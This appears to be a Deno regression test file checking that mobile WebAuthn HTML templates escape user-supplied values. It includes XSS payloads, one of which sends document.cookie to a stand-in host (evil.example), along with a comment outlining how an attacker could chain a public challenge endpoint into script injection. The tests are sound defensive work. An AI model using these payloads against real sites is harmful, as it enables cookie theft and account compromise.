/**
 * Regression coverage for the mobile WebAuthn HTML templates.
 *
 * challenge/email are constrained upstream (email format, a base64url
 * challenge matched against a stored row) before reaching these templates,
 * but sessionId and rpName (registration) are plain, unconstrained query
 * parameters that are echoed straight into the returned page - into both
 * HTML text and inline <script> string literals - with no character
 * restriction. An attacker who knows a victim's email can obtain a real
 * challenge/credentialId for that account from the public challenge-issuing
 * endpoint, then craft a sessionId/rpName that breaks out of its context to
 * run arbitrary JavaScript on the trusted api.risaboss.com origin, inside a
 * page that also runs a real WebAuthn ceremony for the victim's own passkey.
 *
 * These tests assert the escaping actually closes both injection contexts:
 * HTML text (email, credential display name, error message) and inline
 * <script> string literals (challenge, userId, email, sessionId, rpId,
 * rpName, credentialId).
 */

import { assertEquals, assertStringIncludes } from "jsr:@std/assert"
import { getMobileRegistrationHTML, getMobileAuthenticationHTML, getMobileErrorHTML } from "../utils/html.ts"

const previousAnonKey = Deno.env.get("SUPABASE_ANON_KEY")
Deno.env.set("SUPABASE_ANON_KEY", "test-anon-key")

function restoreAnonKey() {
  if (previousAnonKey === undefined) Deno.env.delete("SUPABASE_ANON_KEY")
  else Deno.env.set("SUPABASE_ANON_KEY", previousAnonKey)
}

// A single payload that, left unescaped, would (a) close the surrounding
// single-quoted JS string, (b) run attacker JS via the resulting `; ... ;`,
// and (c) close the surrounding <script> tag entirely via `</script>`.
const SCRIPT_BREAKOUT_PAYLOAD = `x'; fetch('https://evil.example/c?'+document.cookie); //</script><script>alert(1)</script>`
const HTML_BREAKOUT_PAYLOAD = `<img src=x onerror=alert(1)>`

Deno.test({
  name: "getMobileRegistrationHTML - sessionId cannot break out of its JS string literal",
  async fn() {
    const html = await getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      SCRIPT_BREAKOUT_PAYLOAD,
      "api.risaboss.com",
      "BOSS",
    )

    // The raw payload must never appear verbatim - if it does, it broke out.
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    // No unescaped "</script>" may appear anywhere except the real closing
    // tags this template itself defines.
    const scriptCloseCount = (html.match(/<\/script>/g) ?? []).length
    assertEquals(scriptCloseCount, 1, "the payload's </script> must not add a second real closing tag")
    // The sessionId assignment must still be a single, intact JS statement:
    // the escaped value, quote-closed, semicolon-terminated, nothing injected after it.
    assertStringIncludes(html, `const sessionId = 'x\\'; fetch(\\'https://evil.example/c?\\'+document.cookie); //\\u003C/script\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E';`)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - rpName cannot break out of its JS string literal",
  async fn() {
    const html = await getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "victim@example.com",
      "session-abc",
      "api.risaboss.com",
      SCRIPT_BREAKOUT_PAYLOAD,
    )
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    assertEquals((html.match(/<\/script>/g) ?? []).length, 1)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - email is escaped in both the HTML badge and the script",
  async fn() {
    const html = await getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      HTML_BREAKOUT_PAYLOAD,
      "session-abc",
      "api.risaboss.com",
      "BOSS",
    )
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    // HTML-text context: entity-escaped.
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
    // JS-string context: angle brackets neutralized so no literal "<" survives.
    assertEquals(html.includes("<img src=x onerror=alert(1)>"), false)
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileRegistrationHTML - benign values still round-trip correctly (no over-escaping)",
  async fn() {
    const html = await getMobileRegistrationHTML(
      "challenge-abc",
      "user-123",
      "person@example.com",
      "session-abc-123",
      "api.risaboss.com",
      "BOSS Console",
    )
    assertStringIncludes(html, "<div class=\"value\">person@example.com</div>")
    assertStringIncludes(html, "const sessionId = 'session-abc-123';")
    assertStringIncludes(html, "const rpName = 'BOSS Console';")
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileAuthenticationHTML - sessionId and credentialDisplayName cannot break out",
  async fn() {
    const html = await getMobileAuthenticationHTML(
      "challenge-abc",
      "victim@example.com",
      SCRIPT_BREAKOUT_PAYLOAD,
      "api.risaboss.com",
      "credential-abc",
      HTML_BREAKOUT_PAYLOAD,
      Date.now(),
    )
    assertEquals(html.includes(SCRIPT_BREAKOUT_PAYLOAD), false)
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    assertEquals((html.match(/<\/script>/g) ?? []).length, 1)
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
  },
  sanitizeOps: false,
  sanitizeResources: false,
})

Deno.test({
  name: "getMobileErrorHTML - message is HTML-escaped",
  async fn() {
    const html = await getMobileErrorHTML(HTML_BREAKOUT_PAYLOAD)
    assertEquals(html.includes(HTML_BREAKOUT_PAYLOAD), false)
    assertStringIncludes(html, "&lt;img src=x onerror=alert(1)&gt;")
  },
})

Deno.test({
  name: "cleanup",
  fn: restoreAnonKey,
  sanitizeOps: false,
  sanitizeResources: false,
})
